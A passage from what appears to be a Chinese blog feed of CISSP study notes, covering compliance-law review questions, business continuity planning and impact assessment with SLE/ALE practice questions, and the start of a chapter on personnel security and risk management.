Gramm-Leach-B1iley法案</p></li><li><p>以下哪一项许可协议类型不需要用户在执行之前确认他们己经阅读了协议?<br>A. 标准许可协议<br>B. 拆封协议<br>C. 单击许可协议<br>D. 口头协议</p></li><li><p>什么行业受Gramm-Leach-Bliley方案中的条款影响最直接?<br>A. 卫生保健<br>B. 银行<br>C. 执法<br>D. 防护承包商</p></li><li><p>在美国专利保护期是多长?<br>A. 提交申请日开始14年<br>B. 专利获得日开始14年<br>C. 提交申请日开始20年<br>D. 专利获得日开始20年</p></li><li><p>在处理关于欧盟数据隐私法令下的个人信息时，以下哪一项不是有效的法律依据?<br>A. 合同<br>B. 法律义务<br>C. 市场需求<br>D. 赞成</p></li><li><p>涉及信用卡信息处理时，要符合什么合规义务?<br>A. SOX<br>B. HIPAA<br>C. PCI DSS<br>D. FERPA</p></li><li><p>什么法案更新了健康保险流通与责任法案(HIPAA)中的隐私和安全需求?<br>A. HITECH<br>B. CALEA<br>C. CFAA<br>D. CCCA</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中法律、法规和合规性章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（3）——业务连续性计划</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%E2%80%94%E2%80%94%E4%B8%9A%E5%8A%A1%E8%BF%9E%E7%BB%AD%E6%80%A7%E8%AE%A1%E5%88%92/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（3）——业务连续性计划/</id>
    <published>2018-09-10T01:42:00.000Z</published>
    <updated>2018-10-11T10:12:52.877Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全和风险管理(例如，安全、风险、合规性、法律、法规、业务连续性)</p><ul><li>G. 理解业务连续性需求<ul><li>G.l 开发和文档化项目范围和计划</li><li>G.2 引导业务影响分析</li></ul></li></ul><p>安全运营(例如基本概念、调查、事件管理、灾难恢复)</p><ul><li>N. 参与业务连续性规划和演习</li></ul><h3 id="3-1-业务连续性计划"><a href="#3-1-业务连续性计划" class="headerlink" title="3.1 业务连续性计划"></a>3.1 业务连续性计划</h3><p>　　业务连续性计划(Business Continuity Planning，BCP)涉及对组织各种过程的风险评估，还有在发生风险的情况下为了使风险对组织的影响降至最小程度而制定的各种策略、计划和措施。</p><p>BCP 过程包括以下4 个主要步骤：</p><ul><li>(1) 项目范围和计划编制</li><li>(2) 业务影响评估</li><li>(3) 连续性计划</li><li>(4) 批准和实现</li></ul><h3 id="3-2-项目范围与计划"><a href="#3-2-项目范围与计划" class="headerlink" title="3.2 项目范围与计划"></a>3.2 项目范围与计划</h3><p>　　开发强大的业务连续性计划需要使用经过认证的一套方法。该方法的具体内容如下：</p><ul><li>业务组织从危机计划编制的角度进行结构化分析。</li><li>在高层管理人员准许的情况下，建立BCP团队。</li><li>评估参与业务连续性活动的可用资源。</li><li>管理组织对灾难性事件做出反应的法律和法规方面的分析。</li></ul><h4 id="3-2-1-业务组织分析"><a href="#3-2-1-业务组织分析" class="headerlink" title="3.2.1 业务组织分析"></a>3.2.1 业务组织分析</h4><p>　　业务组织分析确定参与业务连续性计划编制过程的所有相关部门和人员。分析时需要考虑包括下面的一些领域：</p><ul><li>负责为用户提供核心服务业务的运营部门。</li><li>重要的支持服务部门，如IT部门、设备维护部门和其他负责对支持运营部门的系统进行检修的团队。</li><li>高层行政管理人员和对于组织继续生存来说非常重要的关键个人。</li></ul><h4 id="3-2-2-BCP-团队的选择"><a href="#3-2-2-BCP-团队的选择" class="headerlink" title="3.2.2 BCP 团队的选择"></a>3.2.2 BCP 团队的选择</h4><ul><li>来自组织的负责业务所提供核心服务的每个部门代表。</li><li>经过组织结构分析所确认的重要支持部门代表。</li><li>BCP 所涉及领域内的具有技术专长的IT代表。</li><li>了解BCP过程的安全代表。</li><li>熟悉公司法律、法规和契约责任的法律代表。</li><li>来自高层管理部门的代表。</li></ul><h4 id="3-2-3-资源需求"><a href="#3-2-3-资源需求" class="headerlink" title="3.2.3 资源需求"></a>3.2.3 资源需求</h4><ul><li><strong>BCP开发</strong> BCP团队需要某些资源来实施BCP过程的4个要素(项目范围和计划编制、业务影响评估、连续性计划、批准和实现)。此BCP阶段消耗的资源很可能是BCP团队成员和要求帮助计划开发的支持员工所付出的人力。</li><li><strong>BCP测试、培训和维护</strong> BCP的测试、培训和维护阶段会要求一些硬件和软件支持，但是不管怎样，这个阶段的主要支持工作都将涉及活动中部分员工所付出的人力。</li><li><strong>BCP实现</strong> 当灾难来袭且BCP团队认为有必要全面实E处业务连续性计划时，就需要大量的资源。这包含大量的人力(即使不是全部，BCP也仍然很可能成为组织的主力)和对”硬”资源的利用。出于这个原因，团队正确并果断地使用其BCP实现能力是很重要的。</li></ul><h4 id="3-2-4-法律和法规要求"><a href="#3-2-4-法律和法规要求" class="headerlink" title="3.2.4 法律和法规要求"></a>3.2.4 法律和法规要求</h4><p>　　许多行业可能会发现他们要受到联邦政府、州和地方法律或法规的限制，这些限制要求他们实现不同程度的BCP。在BCP过程中，将组织的法律顾问添加进来是非常重要的。法律顾问非常熟悉应用于组织的各种法律、法规和契约责任，在保证组织持续生存从而给包括员工、股东、供应商和用户在内的各方带来利益的同时，他们能够帮助团队实现满足这些要求的计划。</p><h3 id="3-3-业务影响评估"><a href="#3-3-业务影响评估" class="headerlink" title="3.3 业务影响评估"></a>3.3 业务影响评估</h3><p>　　业务影响评估(Business Impact Assessment，BIA)确定了能够决定组织持续发展的资源，以及对这些资源的威胁，并且还评估每种威胁实际出现的可能性以及出现的威胁对业务的影响。<br>决策类型如下：</p><ul><li><strong>定量决策</strong> 定量决策涉及使用数字和公式做出决定。这种数据类型通常以美元表示各种与业务相关的选项。</li><li><strong>定性决策</strong> 定性决策考虑的是非数值因素，例如情感、投资者/顾客的信心、员工的稳定性以及其他感兴趣的事务。这种数据类型通常以优先级类别(例如，高、中、低)表示。</li></ul><h4 id="3-3-1-确定优先级"><a href="#3-3-1-确定优先级" class="headerlink" title="3.3.1 确定优先级"></a>3.3.1 确定优先级</h4><p>　　将确定优先级过程的工作量划分给团队成员的一个主要方法是： 指定每个参与者都创建一个优先级列表，这个列表涉及该参与者所负责部门的业务功能。当整个BCP 团队开会讨论时，团队成员会使用这些优先级列表为整个组织创建一个优先级主列表。</p><h4 id="3-3-2-风险识别"><a href="#3-3-2-风险识别" class="headerlink" title="3.3.2 风险识别"></a>3.3.2 风险识别</h4><p>　　风险具有两种形式：自然风险与人为风险。在这个阶段，BCP团队应当不关心每种风险实际发生的可能性，也不必关心发生风险对业务继续运作的影响破坏程度。</p><h4 id="3-3-3-可能性评估"><a href="#3-3-3-可能性评估" class="headerlink" title="3.3.3 可能性评估"></a>3.3.3 可能性评估</h4><p>　　可能性评估是为了确定每种风险发生的可能性。</p><h4 id="3-3-4-影响评估"><a href="#3-3-4-影响评估" class="headerlink" title="3.3.4 影响评估"></a>3.3.4 影响评估</h4><p>　　从定量的观点出发，业务影响涉及三个特定的度量： 暴露因子、单一损失期望和年度损失期望。</p><ul><li>暴露因子(EF)是指风险对资产造成损失的程度，以资产价值的百分比来表示。</li><li>单一损失期望(SLE)是指每次风险发生后预计造成的货币损失。</li><li>年度损失期望他E)是指一年内由于风险引起资产损失而预计对公司造成的货币损失。</li></ul><h4 id="3-3-5-资源优先级划分"><a href="#3-3-5-资源优先级划分" class="headerlink" title="3.3.5 资源优先级划分"></a>3.3.5 资源优先级划分</h4><p>　　BIA的最后一个步骤是划分针对各种不同风险所分配的业务连续性资源的优先级，这些风险己在BIA前面的任务中进行了确定和评估。定性分析可以证明提高或降低风险的优先级是否正确，这些风险在定量列表中存在并己按照ALE进行分类。</p><h3 id="3-4-连续性计划"><a href="#3-4-连续性计划" class="headerlink" title="3.4 连续性计划"></a>3.4 连续性计划</h3><h4 id="3-4-4-策略开发"><a href="#3-4-4-策略开发" class="headerlink" title="3.4.4 策略开发"></a>3.4.4 策略开发</h4><p>　　连续性计划的策略开发阶段为业务影响评估和BCP开发的连续性计划阶段之间架起了桥梁。BCP团队应当回顾一下BIA前期建立的MTD评估时间，并且确定哪些风险被认为是可接受的，哪些必须采取BCP连续性措施加以缓解。</p><h4 id="3-4-2-预备和处理"><a href="#3-4-2-预备和处理" class="headerlink" title="3.4.2 预备和处理"></a>3.4.2 预备和处理</h4><ul><li><p>人<br>必须确保组织内部的人在紧急事件发生前、发生期间和发生后都是安全的。</p></li><li><p>建筑物/设备</p><ul><li><strong>强化预备措施</strong> BCP应当对要采取的机制和过程进行概述，这些机制和过程可以被用于保护现有的设施能够抵御策略开发阶段定义的风险。这可能会包括一些步骤，这些步骤既可能像修补漏屋顶一样简单，也可能像安装用风遮蔽物和防火墙一样复杂。</li><li><strong>预备场所</strong> 在不可能强化设施抵御风险时，BCP应该确定业务活动可以立即恢复的预备场所(或为所有受影响的关键性业务功能提供的时间至少要低于最大可容忍故障时间)。</li></ul></li><li><strong>基础设施</strong><ul><li><strong>强化系统</strong> 可以通过引入保护性措施来为系统抵御风险，这些措施包括计算机防火抑制系统和不间断电源。</li><li><strong>预备系统</strong> 业务功能也可以通过引入的冗余性得到保护(依赖于不同设备的元余构件，或是完全冗余的系统或通信链接)。</li></ul></li></ul><h4 id="3-4-3-计划批准和实现"><a href="#3-4-3-计划批准和实现" class="headerlink" title="3.4.3 计划批准和实现"></a>3.4.3 计划批准和实现</h4><p>　　资深管理人员的批准和参与是整个BCP 工作成功的关键。如果可能，那么应当尝试获得公司最高领导(如首席执行官、董事长、总裁或类似的业务领导)对计划的批准。这个步骤证明了计划对整个组织的重要性，并且显示了业务领导对业务连续性的承诺。像这样的个人签名还加深了对其他资深经理的影响和计划的可信性，否则他们将会把计划作为必要的但却琐碎的IT 事务丢在一边。</p><h4 id="3-4-4-计划实现"><a href="#3-4-4-计划实现" class="headerlink" title="3.4.4 计划实现"></a>3.4.4 计划实现</h4><p>　　BCP团队应该共同开发一个实现计划，这个计划利用特定的资源，从而尽可能迅速地在给出修改范围和组织环境的情况下取得所声明的过程和预备措施的目标。在完全部署所有这些资源之后，BCP团队应当监督恰当的BCP 维护程序，以便确保计划能够响应业务需求的发展。</p><h4 id="3-4-5-培训和教育"><a href="#3-4-5-培训和教育" class="headerlink" title="3.4.5 培训和教育"></a>3.4.5 培训和教育</h4><p>　　组织中的每个人都应当接受至少一份计划综述简报，从而使他们具有信心，相信业务领导己经考虑到连续性业务的可能风险，并且制定了计划来缓解对组织的影响。具有直接的BCP职责的人们应当受到培训，对其具体的BCP任务进行评估，确保在灾难发生时他们能够有效地完成其任务。此外，至少应当为每个BCP任务培训一名候补人员，以便确保在人员受伤或危机时刻人员不能到位时的冗余性。</p><h3 id="3-5-BCP-文档化"><a href="#3-5-BCP-文档化" class="headerlink" title="3.5 BCP 文档化"></a>3.5 BCP 文档化</h3><p>将BCP方法文档化具有以下优点：</p><ul><li>确保所有BCP 人员都有一个连续性的书面文档，在紧急事件发生时，甚至在资深BCP 团队成员不在现场指导时可以作为参考。</li><li>提供了BCP 过程的历史记录，这对于将来人员试图理解不同过程的内因并对计划进行必要的修改是有用的。</li><li>促使团队成员将他们的想法记录到纸上，这个过程常常有助于确定计划中的缺陷。将计划记录到纸上还可以向不属于BCP 团队的人分发简报，从而进行” 理智的分析” 。</li></ul><h4 id="3-5-1-连续性计划的目标"><a href="#3-5-1-连续性计划的目标" class="headerlink" title="3.5.1 连续性计划的目标"></a>3.5.1 连续性计划的目标</h4><p>　　BCP的最常见目标十分简单： 确保在紧急事件发生时业务的连续性操作。为了满足组织的需求，其他目标也可能被放入文档的这部分内容。</p><h4 id="3-5-2-重要性声明"><a href="#3-5-2-重要性声明" class="headerlink" title="3.5.2 重要性声明"></a>3.5.2 重要性声明</h4><p>　　重要性声明反映了BCP对于组织继续生存能力的关键程度。这份文档通常采取向组织的员工发送信件的形式，声明为什么要将重要的资源放到BCP开发过程中，并且要求所有人员在BCP实现阶段进行协作。这就是高管参与BCP的重要性。如果可以在这封信上签署CEO或类似级别领导的名字，那么这个计划本身将在整个组织内实现改变时产生极大的影响。</p><h4 id="3-5-3-优先级声明"><a href="#3-5-3-优先级声明" class="headerlink" title="3.5.3 优先级声明"></a>3.5.3 优先级声明</h4><p>　　优先级声明是业务影响评估的优先级确定阶段的直接产物，它仅仅涉及按优先次序列出的被认为对连续业务操作具有关键作用的功能。当列出这些优先级后，你还应当包括一个声明，指出它们作为BCP过程的一部分进行开发，并且反映在紧急事件中这些功能对连续性业务操作的重要性。</p><h4 id="3-5-4-组织职责的声明"><a href="#3-5-4-组织职责的声明" class="headerlink" title="3.5.4 组织职责的声明"></a>3.5.4 组织职责的声明</h4><p>　　组织职责的声明也来自于高管，并且可能并入与重要性声明相同的文档内。它基本上反映了”业务连续性是所有人的职责”这一观点。组织职责的声明重申了组织对业务连续性计划的承诺，并且通知组织的员工、供应商和分支机构，要求他们每个人都做他们能够协助BCP过程的所有工作。</p><h4 id="3-5-5-紧急程度和时限的声明"><a href="#3-5-5-紧急程度和时限的声明" class="headerlink" title="3.5.5 紧急程度和时限的声明"></a>3.5.5 紧急程度和时限的声明</h4><p>　　紧急程度和时限的声明表述了实现BCP的关键性，并且概述了由BCP 团队决定的并由上层管理者同意的实现时间表。声明的措辞将依赖于由组织的领导层为BCP过程分配的实际的紧急程度。</p><h4 id="3-5-6-风险评估"><a href="#3-5-6-风险评估" class="headerlink" title="3.5.6 风险评估"></a>3.5.6 风险评估</h4><p>　　对于定量分析来说，应当包括实际的AV、EF、ARO、SLE和ALE数值。对于定性分析来说，风险分析背后的考虑过程应当提供给阅读者。值得注意的是，风险评估内容必须进行定期更新，因为它反映了某个时间点的评估。</p><h4 id="3-5-7-可接受的风险-风险缓解"><a href="#3-5-7-可接受的风险-风险缓解" class="headerlink" title="3.5.7 可接受的风险/风险缓解"></a>3.5.7 可接受的风险/风险缓解</h4><p>　　BCP文档中可接受的风险/风险缓解部分包含BCP过程的策略开发部分的结果。它应该覆盖风险分析部分确定的所有风险，并且概述一个或两个考虑过程(如下所示)：</p><ul><li>对于那些被认为可接受的风险，应当概述风险被认为可接受的原因，以及未来可能导致值得重新考虑这个决定的事件。</li><li>对于那些被认为不可接受的风险，应当概述风险缓解的预备措施和用来减少威胁组织持续生存能力的风险过程。</li></ul><h4 id="3-5-8-重大记录计划"><a href="#3-5-8-重大记录计划" class="headerlink" title="3.5.8 重大记录计划"></a>3.5.8 重大记录计划</h4><p>　　这份文档阐述了关键业务记录将要存放的地方和对这些记录建立和存储副本的过程。<br>　　执行重大记录计划最大的挑战之一，通常首要的是识别重大记录。在许多组织从纸质转换为数字工作流时，他们常常丢失了围绕创建和维护正式文件结构的精确性。重大记录可能现在分布在各种IT系统和云服务中。一些可能会存储在团队可访问的中央服务器上，然而其他可能位于数字仓库中，并分配给一个员工。</p><h4 id="3-5-9-晌应紧急事件的指导原则"><a href="#3-5-9-晌应紧急事件的指导原则" class="headerlink" title="3.5.9 晌应紧急事件的指导原则"></a>3.5.9 晌应紧急事件的指导原则</h4><p>　　紧急事件响应指导原则概述了组织和个人对于紧急事件立即响应的职责。此文档为首先发现紧急事件的员工提供了激活未自动激活的BCP预备措施的步骤，这些指导原则应当包括下列内容：</p><ul><li>立即响应规程(安全性规程、防火规程、通知恰当的紧急事件代理机构等)</li><li>事件通知清单(主管、BCP团队成员等)</li><li>在等待BCP团队集中时采取的二级响应规程</li></ul><h4 id="3-5-10-维护"><a href="#3-5-10-维护" class="headerlink" title="3.5.10 维护"></a>3.5.10 维护</h4><p>　　每个组织都会遇到几乎持续的变化，这种动态特性也确保了业务连续性要求随之发生变化。BCP团队不应该在计划开发完成后被解散，而是应当定期接触并讨论计划、复审计划测试的结果，以确保能够继续满足组织的要求。<br>　　在更新BCP的任何时候，必须进行良好的版本控制。所有旧的BCP版本都应该进行物理销毁，并且被最新版本代替，这样就不会产生对BCP正确实现的混淆。将BCP 组件包含在工作描述中以便确保BCP保持更新和正确实施是很好的习惯。员工的工作描述中包含BCP职责也会使其成为绩效审查过程考虑的对象。</p><h4 id="3-5-11-测试和演习"><a href="#3-5-11-测试和演习" class="headerlink" title="3.5.11 测试和演习"></a>3.5.11 测试和演习</h4><p>　　BCP文档还应当概述一个正式的测试计划，以确保计划是最新的，并且所有人员都接受了充分培训，从而在实际的灾难事件发生时能够履行他们的职责。测试过程实际上与用于灾难恢复的计划非常类似。</p><h3 id="3-6-考试要点"><a href="#3-6-考试要点" class="headerlink" title="3.6 考试要点"></a>3.6 考试要点</h3><ul><li><strong>理解业务连续性计划编制过程的4个步骤</strong> 业务连续性计划涉及4个不同的阶段： 项目范围和计划编制、业务影响评估、连续性计划、批准和实现。每个任务都为整体目标服务，从而确保业务在发生紧急事件时不会中断井持续运营。</li><li><strong>描述如何执行业务结构分析</strong> 在业务结构分析中，负责领导BCP过程的人确定哪些部门和个人会参与业务连续性计划。这种分析被用作BCP团队选择的基础，并且在BCP团队确认后被用于指导BCP开发的后续阶段。</li><li><strong>列出业务连续性计划团队的必要成员</strong> BCP团队至少应当包括下列人员：<ul><li>每个运营和支持部门的代表</li><li>IT部门的技术专家</li><li>具有BCP技能的安全人员</li><li>熟悉公司法律、规章、契约责任的法律代表以及高管代表</li><li>其他团队成员取决于组织的结构和特性。</li></ul></li><li><strong>了解业务连续性计划编制者面对的法律和规章要求</strong> 业务领导必须尽职，以确保股东的利益在灾难事件发生时得到保护。美国的一些行业还必须服从美国联邦、州|和当地的法规，这些法规要求特殊的BCP规程。很多业务在灾难发生之前和之后都具有客户必须满足的合约义务。</li><li><strong>解释业务影响评估过程的步骤</strong> 业务影响评估过程的5 个步骤包括优先级确定、风险确定、可能性评估、影响评估和资源优先级划分。</li><li><strong>描述连续性策略的开发过程</strong> 在策略开发阶段，BCP团队确定哪些风险要进行缓解。在预备和处理阶段，将会对实际缓解风险的机制和规程进行设计。计划必须随后得到高管的批准并且加以实现。人员还必须接受其在BCP 过程中所处角色的培训。</li><li><strong>解释为组织机构的业务连续性计划进行全部文档化的重要性</strong> 将计划记录下来，以便在灾难发生时为计划的实施提供规程上的书面记录。这避免了”在我脑子里”的综合症，从而确保在紧急事件中有序地实施计划。</li></ul><h3 id="3-7-复习题"><a href="#3-7-复习题" class="headerlink" title="3.7 复习题"></a>3.7 复习题</h3><ol><li><p>对于那些对业务连续性计划开发负责的人来说，第一步应该执行什么?<br>A. 团队选择<br>B. 业务组织分析<br>C. 资源需求分析<br>D. 法律和合规性评估</p></li><li><p>一旦BCP 团队选定，放在团队议程首要位置的是什么?<br>A. 业务影响评估<br>B. 业务组织评估<br>C. 资源需求评估<br>D. 法律和合规性评估</p></li><li><p>在组织持续生存方面，为确保适当的措施用于减少灾难影响，以下哪一项描述了企业管理人员和总监的责任?<br>A 企业责任<br>B. 灾难需求<br>C. 应尽关注<br>D. 持续经营责任</p></li><li><p>在BCP阶段，BCP过程消耗的主要资源将是什么?<br>A. 硬件<br>B. 软件<br>C. 处理时间<br>D. 人员</p></li><li><p>在业务影响评估的优先级识别阶段，什么测量单位用于资产价值量化?<br>A. 货币<br>B. 效用<br>C. 重要性<br>D. 时间</p></li><li><p>下列哪一项目A条款标识了一个特定风险每年预计损失的货币量?<br>A. ARO<br>B. SLE<br>C. ALE<br>D. EF</p></li><li><p>什么BIA度量值被用于表示一个业务功能的最长中断时间，但这个中断没有对组织产生不可弥补的损害?<br>A. SLE<br>B. EF<br>C. MTD<br>D. ARO</p></li><li><p>你担心雪崩这个风险会威胁到你的300万美金运输设施。基于业内意见，你确定每年雪崩有5%的几率发生。专家提醒你，雪崩会彻底摧毁你的建筑物，井迫使你在同一块土地上重建。这300万美金的设施中90%的价值是大楼，另外10%是土地本身。雪崩对于你的运输设施的单一损失期望是多少?<br>A. 300 万美金<br>B. 270 万美金<br>C. 27 万美金<br>D. 13.5 万美金</p></li><li><p>在问题8提到的场景中，年度损失预期是多少?<br>A. 300 万美金<br>B. 270 万美金<br>C. 27 万美金<br>D. 13.5 万美金</p></li><li><p>你担心咫风会对设在南佛罗里达州的公司总部造成风险。这个建筑物本身价值1500万美金。在咨询了国家气象服务部门后，你确定咫风在一年之中袭击的可能性有10%。你雇佣了一支由建筑师和工程师组成的团队，确定了一般的咫风会摧毁约50%的建筑物。年度损失期望(ALE)是多少?<br>A. 75 万美金<br>B. 150 万美金<br>C. 750 万美金<br>D. 1500 万美金</p></li><li><p>以下哪个BCP任务连接业务影响评估和连续性规划阶段?<br>A. 资源优先级<br>B. 可能性评估<br>C. 策略开发<br>D. 条款和流程</p></li><li><p>当设计连续性计划条款和流程时，首先应该保护哪个资源?<br>A. 厂房<br>B. 基础设施<br>C. 金融<br>D. 人</p></li><li><p>在业务影响评估过程中，下列哪个观点不适合定量测量?<br>A 厂房的损失<br>B. 车辆的损坏<br>C. 负面宣传<br>D. 断电</p></li><li><p>Lighter Than Air 公司预计如果龙卷风袭击了它的飞机业务设施，就会损失1000万美金。假设龙卷风袭击设施每100年会发生一次。那么在这个场景下单一损失期望是多少?<br>A. 0.01<br>B. 1000 万美金<br>C. 10 万美金<br>D. 0.10</p></li><li><p>根据问题14提到的场景，年度损失期望是多少?<br>A. 0.01<br>B. 1000 万美金<br>C. 10 万美金<br>D. 0.10</p></li><li><p>在哪个业务连续性计划任务中，会设计流程和机制以减少BCP团队认定的不可接受的风险?<br>A. 策略阶段<br>B. 业务影响评估<br>C. 条款和流程<br>D. 资源优先级</p></li><li><p>安装元余通信链路，这是利用了什么类型的缓解条款?<br>A. 加固系统<br>B. 定义系统<br>C. 减轻系统<br>D. 更换系统</p></li><li><p>如果灾难中断了业务的正常运行，什么类型的计划概述了相关处理流程?<br>A. 业务连续性计划<br>B. 业务影响评估<br>C. 灾难恢复计划<br>D. 脆弱性评估</p></li><li><p>用于为单个风险场景计算单一损失期望的公式是什么?<br>A. SLE = AV x EF<br>B. SLE = RO x EF<br>C. SLE = AV x ARO<br>D. SLE = EF x ARO</p></li><li><p>对于下面列出的人员，一份重要的业务连续性计划声明会对谁提供最佳承诺?<br>A. 业务运营副总裁<br>B. 首席信息官<br>C. 首席执行官<br>D. 业务连续性经理</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中业务连续性计划章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（2）——人员安全和风险管理概念</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%E2%80%94%E2%80%94%E4%BA%BA%E5%91%98%E5%AE%89%E5%85%A8%E5%92%8C%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%E6%A6%82%E5%BF%B5/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（2）——人员安全和风险管理概念/</id>
    <published>2018-09-07T01:42:00.000Z</published>
    <updated>2018-10-11T10:12:52.874Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全和风险管理(例如安全、风险、合规性、法律、法规、业务连续性)</p><ul><li>H. 促进人员安全策略<ul><li>H.l 筛选候选人(例如背景检测、教育核查)</li><li>H.2 雇佣协议和策略</li><li>H.3 解雇员工的流程</li><li>H.4 供货商、顾问和承包商控制</li><li>H.5 合规性</li><li>H.6 隐私</li></ul></li><li>I. 理解和应用风险管理的概念<ul><li>I.1 识别威胁和脆弱性</li><li>I.2 风险评估/分析(定性、定量、混合)</li><li>I.3 风险分配/接受(例如系统授权)</li><li>I.4 措施选择</li><li>I.5 实施</li><li>I.6 控制类型(阻止、检测、纠正等)</li><li>I.7 控制评估</li><li>I.8 监控和测量</li><li>I.9 资产评估</li><li>I.10 报告</li><li>I.11 持续改进</li><li>I.l2 风险框架</li></ul></li><li>L. 建立和管理信息安全教育、培训和意识<ul><li>L.l 适合组织需要的水平的安全意识、培训和教育</li><li>L.2 定期的内容相关审查<br>安全评估与测试(设计、执行和分析安全测试)</li></ul></li><li>C.5 培训和意识</li></ul><h3 id="2-1-促进人员安全策略"><a href="#2-1-促进人员安全策略" class="headerlink" title="2.1 促进人员安全策略"></a>2.1 促进人员安全策略</h3><p>　　在任何安全解决方案中，人都是最薄弱的环节。无论部署怎样的物理或逻辑控制，人总能发现避免受到控制、回避或消除控制以及禁用控制的方法。<br>在构建工作描述方面的重要元素包括职责分离、工作职责和岗位轮换：</p><ul><li><strong>职责分离</strong> 职责分离属于安全概念，是指把关键的、重要的和敏感的工作任务分配给若干不同的管理员或高级执行者。这样做能阻止任何一个人具备破坏或削弱重要安全机制的能力。可以将职责分离视为对管理员的最小特权原则的应用。职责分离也能够防止共谋，共谋指的是负面活动由两人或多人共同完成，其意图往往是伪造、偷窃或间谍行为。</li><li><strong>工作职责</strong> 工作职责是要求员工在常规的基础上执行的特定工作任务。根据他们的职责，员工需要访问各种不同的对象、资源和服务。在安全的网络上，用户必须被授予访问与其工作任务有关元素的权限。为了保持最大的安全性，应该按照最小特权原则分配访问权限。最小特权原则规定：在安全环境中，应该授予用户完成工作任务或工作职责所必需的最小访问权限。这条原则的实际应用要求对所有资源和功能进行低级别的粒度访问控制。</li><li><strong>岗位轮换</strong> 岗位轮换是一种简单的方法，组织通过让员工在不同的工作岗位间轮换职位来提高整体安全性。岗位轮换有两个作用。首先，它提供了一种知识冗余类型。当许多员工中的每一位都有能力胜任所要求的若干工作岗位时，如果因为疾病或其他事件导致一位或多位员工在较长的时间内无法工作，那么组织遭受严重停工或生产效率降低的可能性就较小。</li></ul><h4 id="2-1-1-筛选候选人"><a href="#2-1-1-筛选候选人" class="headerlink" title="2.1.1 筛选候选人"></a>2.1.1 筛选候选人</h4><p>　　对于职位的安全性来说，背景调查和安全检查是证明候选人能够胜任工作、具备工作资格和值得信赖的必要因素。</p><h4 id="2-1-2-雇佣协议和策略"><a href="#2-1-2-雇佣协议和策略" class="headerlink" title="2.1.2 雇佣协议和策略"></a>2.1.2 雇佣协议和策略</h4><p>　　雇佣新员工时，应该签署雇佣协议。协议文档概略说明了组织的规则和限制、安全策略、可接受的使用和行为准则、详细的工作描述、破坏活动及其后果、要求员工胜任工作所需的时间。其中，很多条目都是独立的文挡。<br>　　保密协议(NonDisclosure Agreement，NDA)用来保护组织的机密信息不会被以前的员工泄漏。</p><h4 id="2-1-3-解雇员工的流程"><a href="#2-1-3-解雇员工的流程" class="headerlink" title="2.1.3 解雇员工的流程"></a>2.1.3 解雇员工的流程</h4><p>　　离职面谈的主要目的是： 根据前雇员签署的雇佣协议、保密协议和其他安全相关文档来审查责任和约束条件。<br>以下列出了应该尽快处理的其他事直：</p><ul><li>确认员工己归还放在交通工具或家中的组织配发的装置或供应品。</li><li>删除或禁用员工的网络用户账号。</li><li>通知人力资源部门支付最后的薪水，把未使用的休假换成工资，终止所有的福利待遇。</li><li>安排安全部门的人员陪同被解雇的员工在工作场所收拾他们的个人物品。</li><li>通知所有安全人员以及监控出入口的其他人员，确保被解雇的员工只能在安全人员护送下再次进入工作场所。</li></ul><h4 id="2-1-4-供应商、顾问和承包商控制"><a href="#2-1-4-供应商、顾问和承包商控制" class="headerlink" title="2.1.4 供应商、顾问和承包商控制"></a>2.1.4 供应商、顾问和承包商控制</h4><p>服务级别协议(Service-Level Agreement，SLA)中处理的常见问题：</p><ul><li>系统运行时间(作为总体运行时间的百分比)</li><li>最长连续停机时间( 以秒或分钟等计算)</li><li>最大负载</li><li>平均负载</li><li>诊断任务</li><li>故障转移时间(如果冗余处于适当位置)</li></ul><h4 id="2-1-5-合规性"><a href="#2-1-5-合规性" class="headerlink" title="2.1.5 合规性"></a>2.1.5 合规性</h4><p>　　合规是符合或遵守规则、策略、法规、标准或要求的行为。</p><h4 id="2-1-6-隐私"><a href="#2-1-6-隐私" class="headerlink" title="2.1.6 隐私"></a>2.1.6 隐私</h4><ul><li>主动防止对个人可确认的信息(也就是与某人或某个组织直接联系的数据点)的未授权访问。</li><li>防止对被视为个人的或秘密的信息进行未授权的访问。</li><li>防止未被同意或知晓的观察、监控或检查行为。</li></ul><h3 id="2-2-安全治理"><a href="#2-2-安全治理" class="headerlink" title="2.2 安全治理"></a>2.2 安全治理</h3><p>　　安全治理是与支持、定义和指导组织安全工作相关的实践集合。</p><h3 id="2-3-理解和应用风险管理概念"><a href="#2-3-理解和应用风险管理概念" class="headerlink" title="2.3 理解和应用风险管理概念"></a>2.3 理解和应用风险管理概念</h3><p>　　风险管理的主要目的是要将风险降低到一个可以接受的级别。达到风险管理主要目标的过程被称为风险分析。<br>风险分析包括：</p><ul><li>分析环境中的风险</li><li>评估每种风险发生的可能性和造成的损失</li><li>评估各种风险对策的成本以及生成安全措施的成本/效益报告并呈交给上级管理者</li></ul><h4 id="2-3-1-风险术语"><a href="#2-3-1-风险术语" class="headerlink" title="2.3.1 风险术语"></a>2.3.1 风险术语</h4><ul><li><strong>资产</strong> 资产是指环境中应该加以保护的任何事物，是用于商业过程和任务中的任何东西。</li><li><strong>资产估值</strong> 资产估值指的是根据实际的成本和非货币性支出为资产分配的货币价值。</li><li><strong>威胁</strong> 